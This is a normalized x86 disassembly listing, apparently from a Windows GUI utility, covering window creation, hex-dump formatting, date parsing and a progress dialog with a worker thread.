mov edi [ esp + 0x58 ]
push 0xfffffffa
push edi
call [ GetWindowLongA@IAT ]
xor ebx ebx
push 0x7f00
mov esi eax
push ebx
mov [ esp + 0x40 ] esi
mov [ esp + 0x54 ] r--data
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x30
mov [ esp + 0x44 ] ebx
mov [ esp + 0x58 ] ebx
call [ LoadCursorA@IAT ]
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x4c ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x30 ] sub_42bde0
call [ RegisterClassExA@IAT ]
push ebx
push esi
push ebx
push edi
push 0x12c
push 0x1cc
push 0x80000000
push 0x80000000
push 0xcc0000
push r--data
push r--data
push ebx
call [ CreateWindowExA@IAT ]
mov esi eax
cmp esi ebx
mov [ esp + 0x1c ] esi
jne r-xdata
mov al [ esp + 0x64 ]
test al al
push ebp
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x48
retn
mov edx [ esp + 0x60 ]
push edx
push ebx
push 0xc
push 0x64
push esi
call [ SendDlgItemMessageA@IAT ]
mov ebp [ esp + 0x64 ]
add ebp 0xf
shr ebp 0x4
cmp ebp 0x200
mov [ esp + 0x18 ] ebp
jle r-xdata
mov ecx ebp
imul ecx ecx 0x4a
add ecx 0x4b
push ecx
call j_sub_4b573e#2
mov edi eax
add esp 0x4
cmp edi ebx
mov [ esp + 0x24 ] edi
je r-xdata
mov [ esp + 0x18 ] 0x200
mov ebp [ esp + 0x18 ]
push 0x5
push esi
call [ ShowWindow@IAT ]
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x48
retn
push r--data
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
mov esi eax
add esi edi
cmp ebp ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x1c ] ebx
jle r-xdata
mov ecx [ esp + 0x20 ]
push edi
push ebx
push 0xc
push 0x64
push ecx
mov [ esi ] 0x0
call [ SendDlgItemMessageA@IAT ]
push edi
call j_sub_4b66ed
mov esi [ esp + 0x24 ]
add esp 0x4
jmp r-xdata
mov ebp [ esp + 0x60 ]
mov ebx [ wsprintfA@IAT ]
nop
mov eax [ esp + 0x14 ]
lea ecx [ edi + eax ]
cmp ecx [ esp + 0x64 ]
jb r-xdata
movzx edx [ edi + ebp ]
push edx
push r--data
push esi
call ebx
add esp 0xc
push r--data
push esi
call ebx
add esp 0x8
jmp r-xdata
xor ecx ecx
add esi 0x3
inc edi
cmp edi 0x10
jl r-xdata
mov al [ esp + 0x13 ]
test al al
mov al [ ecx + ebp ]
je r-xdata
mov [ esi ] 0x20
jmp r-xdata
cmp al 0x81
jb r-xdata
cmp al 0x40
mov [ esp + 0x13 ] 0x0
jb r-xdata
inc esi
inc ecx
cmp ecx 0x10
jl r-xdata
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x7e
jbe r-xdata
mov eax [ esp + 0x14 ]
lea edx [ ecx + eax ]
cmp edx [ esp + 0x64 ]
jb r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
add ecx 0x10
add ebp 0x10
mov [ esi ] 0x20
inc esi
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x1c ]
dec eax
cmp ecx eax
jge r-xdata
cmp al 0x20
jb r-xdata
cmp al 0xef
ja r-xdata
mov [ esp + 0x13 ] 0x1
test ecx ecx
jne r-xdata
cmp al 0xfc
ja r-xdata
test ecx ecx
jne r-xdata
mov eax [ esp + 0x18 ]
inc ecx
cmp ecx eax
mov [ esp + 0x1c ] ecx
jl r-xdata
mov [ esi ] 0xd
inc esi
mov [ esi ] 0xa
inc esi
mov [ esi ] 0xa5
cmp al 0x7e
ja r-xdata
mov [ esi - 0x1 ] 0xa5
jmp r-xdata
mov [ esi - 0x3b ] 0xa5
mov [ esi ] al
jmp r-xdata
mov al [ ebp ]
mov [ esi - 0x3a ] al
mov [ esi ] 0x20
jmp r-xdata
mov edx [ esp + 0x1c ]
shl edx 0x4
push edx
push r--data
push esi
call ebx
add esp 0xc
add esi 0x7
xor edi edi
jmp r-xdata
mov edi [ esp + 0x24 ]
xor ebx ebx
mov [ esi ] al
jmp r-xdata
sub_42c180
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
movzx edx [ esp + 0xc ]
movzx eax [ esp + 0xa ]
movzx ecx [ esp + 0x8 ]
push edx
movzx edx [ esp + 0xa ]
push eax
movzx eax [ esp + 0xa ]
push ecx
movzx ecx [ esp + 0xc ]
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x30
retn
sub_42c1d0
sub esp 0x118
mov ecx [ esp + 0x11c ]
push ebx
xor ebx ebx
xor eax eax
xor edx edx
cmp ecx ebx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
je r-xdata
pop ebx
add esp 0x118
retn
cmp [ ecx ] bl
je r-xdata
push esi
mov eax 0x1
push 0x100
mov [ esp + 0xe ] ax
mov [ esp + 0x12 ] ax
mov [ esp + 0x10 ] ax
push ecx
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x14 ] bx
mov [ esp + 0x1c ] bx
mov [ esp + 0x1e ] bx
mov [ esp + 0x20 ] bx
mov [ esp + 0x22 ] bx
call [ lstrcpynA@IAT ]
cmp [ esp + 0x20 ] 0x2f
lea esi [ esp + 0x20 ]
je r-xdata
cmp [ esi ] bl
je r-xdata
cmp [ esi ] bl
je r-xdata
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0xc ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
pop esi
lea ecx [ esp + 0x20 ]
mov [ esi ] bl
push ecx
inc esi
call j_sub_4b692d
mov cl [ esi ]
add esp 0x4
cmp cl 0x2f
mov [ esp + 0x8 ] ax
mov eax esi
je r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x2f
jne r-xdata
cmp [ esi ] bl
je r-xdata
lea esp [ esp ]
mov [ esi ] bl
push eax
inc esi
call j_sub_4b692d
mov cl [ esi ]
add esp 0x4
cmp cl 0x2f
mov [ esp + 0xa ] ax
mov eax esi
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
cmp cl 0x2f
jne r-xdata
cmp [ esi ] bl
je r-xdata
cmp [ esi ] bl
je r-xdata
cmp [ esi ] bl
je r-xdata
mov [ esi ] bl
push eax
inc esi
call j_sub_4b692d
mov cl [ esi ]
add esp 0x4
cmp cl 0x2f
mov [ esp + 0xe ] ax
mov eax esi
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
cmp cl 0x2f
jne r-xdata
cmp [ esi ] bl
je r-xdata
cmp [ esi ] bl
je r-xdata
mov [ esi ] bl
push eax
inc esi
call j_sub_4b692d
mov cl [ esi ]
add esp 0x4
cmp cl 0x2f
mov [ esp + 0x10 ] ax
mov eax esi
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
cmp cl 0x2f
jne r-xdata
cmp [ esi ] bl
je r-xdata
cmp [ esi ] bl
je r-xdata
mov [ esi ] bl
push eax
inc esi
call j_sub_4b692d
mov [ esp + 0x16 ] ax
mov al [ esi ]
add esp 0x4
cmp al 0x2f
mov ecx esi
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
cmp cl 0x2f
jne r-xdata
push ecx
call j_sub_4b692d
add esp 0x4
mov [ esp + 0x14 ] ax
nop
mov al [ esi + 0x1 ]
inc esi
cmp al 0x2f
jne r-xdata
cmp al bl
je r-xdata
sub_42c3c0
push ecx
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
push esi
push edi
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
mov esi ebx
imul esi esi 0x70
add esi edi
test eax eax
je r-xdata
cmp ebx edx
jge r-xdata
mov eax [ rw-data ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call sub_460b70
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
mov [ esp + 0x14 ] 0x0
lea eax [ esi + 0x4 ]
jb r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ rw-data ]
jg r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ esp + 0x14 ]
je r-xdata
mov eax [ rw-data ]
test eax eax
jg r-xdata
mov edi eax
mov edi [ eax ]
jmp r-xdata
push eax
call sub_4b55f0
add esp 0x4
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax rw-data
mov edi [ esi + 0x24 ]
shl eax 0xa
cdq
cmp edi edx
ja r-xdata
test ecx ecx
jle r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push eax
call sub_457f40
mov edx [ rw-data ]
add esp 0x4
add eax edi
push eax
push edx
call sub_4b5150
add esp 0x10
test eax eax
je r-xdata
mov eax [ eax ]
cmp ecx 0x10
jb r-xdata
test ecx ecx
je r-xdata
jb r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ esp + 0xc ]
je r-xdata
cmp ecx eax
jg r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
je r-xdata
mov eax ecx
mov ecx [ esi + 0x24 ]
shl eax 0xa
cdq
cmp ecx edx
jb r-xdata
mov edx [ esi + 0x20 ]
cmp edx eax
jb r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx eax
jl r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_4b4130
add esp 0x4
ja r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ecx
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esi + 0x2c ]
cmp edx eax
ja r-xdata
cmp ecx eax
jg r-xdata
mov edx [ esi + 0x20 ]
cmp edx eax
ja r-xdata
mov edx [ esi + 0x2c ]
cmp edx eax
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ esi + 0x28 ]
cmp eax ecx
jb r-xdata
mov eax [ esi + 0x28 ]
cmp eax ecx
ja r-xdata
sub_42c5d0
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x20 ] 0x0
pop esi
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_42c600
push 0xffffffff
push sub_4bfe18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_42c680
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfe30
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_42c600
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_42c920
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_42c680
pop edi
pop esi
retn 0x8
sub_42c9b0
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x10 ]
cmp ecx edx
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
retn 0xc
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_465da0
mov ebx [ ebp + 0x8 ]
mov esi eax
add esp 0x10
cmp esi ebx
mov edi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ ebp + 0x8 ] esi
mov ecx edi
call sub_401a90
add edi 0x70
cmp edi ebx
jne r-xdata
sub_42ca10
push ebx
mov ebx [ esp + 0x8 ]
mov al [ ebx + 0x34 ]
test al al
push ebp
mov ebp [ ebx + 0x24 ]
push esi
push edi
mov [ esp + 0x14 ] ebp
jne r-xdata
mov eax [ ebx + 0x30 ]
push ebx
push 0x0
push 0x1401
push eax
call [ PostMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
push ebp
call sub_42c3c0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebx + 0x3c ]
mov eax [ ebx + 0x2c ]
inc ecx
add ebp eax
mov [ ebx + 0x3c ] ecx
mov eax [ rw-data ]
mov [ esp + 0x14 ] ebp
jns r-xdata
mov edx [ ebx + 0x18 ]
test edx edx
lea esi [ ebx + 0x14 ]
jne r-xdata
cmp ebp eax
jl r-xdata
lea ebp [ eax - 0x1 ]
mov [ esp + 0x14 ] ebp
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
cmp ebp [ ebx + 0x28 ]
je r-xdata
xor ebp ebp
mov [ esp + 0x14 ] ebp
mov eax [ esi + 0x8 ]
lea edx [ esp + 0x14 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_41ce70
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov al [ ebx + 0x34 ]
test al al
je r-xdata
mov eax [ esp + 0x14 ]
mov edi [ esi + 0x8 ]
push eax
push esi
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
jmp r-xdata
mov al [ ebx + 0x10 ]
test al al
je r-xdata
sub_42caf0
mov eax [ esp + 0x8 ]
sub esp 0x20
cmp eax 0x111
push ebx
push esi
push edi
ja r-xdata
cmp eax 0x113
je r-xdata
je r-xdata
mov ebx [ esp + 0x30 ]
push 0xffffffeb
push ebx
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x3c ]
push 0x0
cdq
push 0x0
mov edi eax
push 0xdd7
xor edi edx
push ebx
sub edi edx
call [ GetDlgItemInt@IAT ]
cmp eax edi
je r-xdata
cmp eax 0x1401
je r-xdata
movzx eax [ esp + 0x38 ]
sub eax 0x2
jne r-xdata
sub eax 0x2
je r-xdata
mov al [ esi + 0x4 ]
test al al
jne r-xdata
push 0x0
push edi
push 0xdd7
push ebx
call [ SetDlgItemInt@IAT ]
mov eax [ esi + 0x3c ]
push 0x0
push eax
push 0x402
push 0xdd6
push ebx
call [ SendDlgItemMessageA@IAT ]
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x38 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x38 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ esp + 0x38 ]
push edx
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x20
retn 0x10
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov ecx [ esi + 0x38 ]
push 0xffffffff
push ecx
mov [ esi + 0x34 ] 0x1
call [ WaitForSingleObject@IAT ]
mov edx [ esi + 0x38 ]
push edx
call [ CloseHandle@IAT ]
push 0x1
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
mov eax [ esp + 0x30 ]
push 0x1
push eax
call [ KillTimer@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
sub eax 0x10e
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
call [ GetTickCount@IAT ]
sub eax [ esi ]
cmp eax 0x1f4
jbe r-xdata
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x30 ]
push ebp
push edi
push 0xffffffeb
push esi
call [ SetWindowLongA@IAT ]
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetParent@IAT ]
mov ebx [ GetWindowRect@IAT ]
push eax
call ebx
lea ecx [ esp + 0x20 ]
push ecx
push esi
call ebx
mov ebp [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
sub eax ebp
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x1c ]
mov ebp eax
mov eax [ esp + 0x24 ]
sar ebp 0x1
add ebp ecx
sub eax [ esp + 0x2c ]
mov ecx [ esp + 0x14 ]
sub eax ecx
add eax edx
cdq
sub eax edx
lea edx [ esp + 0x10 ]
mov ebx eax
push edx
sar ebx 0x1
push esi
add ebx ecx
call [ GetWindowRect@IAT ]
push 0x4
push 0x0
push 0x0
push ebx
push ebp
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov ebx [ SetDlgItemInt@IAT ]
sub eax ecx
mov ecx [ esp + 0x1c ]
push 0x1
push 0x0
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x1c ]
push 0xdd7
sub ecx eax
push esi
mov [ edi + 0xc ] ecx
call ebx
mov edx [ rw-data ]
push 0x1
push edx
push 0xdd8
push esi
call ebx
push 0xdd6
push esi
call [ GetDlgItem@IAT ]
movzx ecx [ rw-data ]
shl ecx 0x10
push ecx
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x0
push 0x14
push 0x1
push esi
call [ SetTimer@IAT ]
lea edx [ esp + 0x34 ]
push edx
push 0x0
push edi
push sub_42ca10
push 0x0
push 0x0
mov [ edi + 0x34 ] 0x0
mov [ edi + 0x30 ] esi
mov [ edi + 0x3c ] 0x0
call sub_4b638f
add esp 0x18
test eax eax
mov [ edi + 0x38 ] eax
pop ebp
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push 0x6
push ecx
push edx
push 0x0
push 0x0
push 0x0
push ebx
call [ SetWindowPos@IAT ]
mov [ esi + 0x4 ] 0x1
push 0xfffffff7
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
sub_42cdb0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfe48
push eax
mov [ fs : 0x0 ] esp
push ebx
push ebp
push esi
push edi
mov ebp [ ecx + 0x4 ]
test ebp ebp
mov [ esp + 0x18 ] 0x0
jne r-xdata
mov esi [ ecx + 0x8 ]
sub esi ebp
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
mov edi [ esp + 0x20 ]
cmp edx edi
jae r-xdata
mov eax [ esp + 0x90 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov ebx [ ecx + 0x8 ]
mov esi ebx
sub esi ebp
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov esi [ ecx + 0x8 ]
sub esi ebp
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp [ esp + 0x3c ] esi
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
jb r-xdata
mov eax [ esp + 0x7c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
imul edi edi 0x70
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] ebx
mov eax [ ecx + 0x4 ]
push ecx
mov edx esp
add edi eax
mov [ edx ] edi
lea edx [ esp + 0x28 ]
mov [ esp + 0x28 ] esp
push edx
call sub_42c9b0
lea eax [ esp + 0x24 ]
push eax
sub edi edx
mov edx [ ecx + 0x8 ]
push edi
push ecx
mov eax esp
mov [ esp + 0x2c ] esp
mov [ eax ] edx
call sub_406c50
jmp r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x74
mov ecx [ esp + 0x28 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_42cee0
push ecx
sub esp 0x70
mov eax esp
xor edx edx
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] dl
mov [ eax + 0x6c ] 0xf
mov [ eax + 0x68 ] edx
mov [ eax + 0x58 ] dl
mov eax [ esp + 0x78 ]
mov [ esp + 0x70 ] esp
push eax
call sub_42cdb0
pop ecx
retn 0x4
sub_42cf20
push 0xffffffff
push sub_4bfe68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push ebp
push esi
xor esi esi
push edi
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] esi
mov [ esp + 0x68 ] esi
call [ GetTickCount@IAT ]
mov [ esp + 0x20 ] eax
mov eax 0x1
mov [ esp + 0x4c ] eax
mov [ esp + 0x30 ] al
lea eax [ esp + 0x20 ]
push eax
mov eax [ rw-data ]
push sub_42caf0
push eax
push 0xc26
push 0xfffffffa
push eax
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x5c ] esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x68 ] esi
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
mov al [ esp + 0x54 ]
test al al
jne r-xdata
mov eax [ esp + 0x38 ]
cmp eax esi
je r-xdata
mov edx [ esp + 0x38 ]
cmp edx esi
je r-xdata
mov ecx [ esp + 0x60 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x5c
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
push esi
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov eax ecx
sub eax edx
sar eax 0x2
cmp eax esi
jne r-xdata
mov ebx [ rw-data ]
xor edi edi
mov [ esp + 0x1c ] esi
mov eax ecx
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp edx esi
jne r-xdata
mov esi [ edx + edi * 4 ]
cmp edi esi
mov edx edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] edx
jge r-xdata
cmp edi eax
jge r-xdata
sub ecx edx
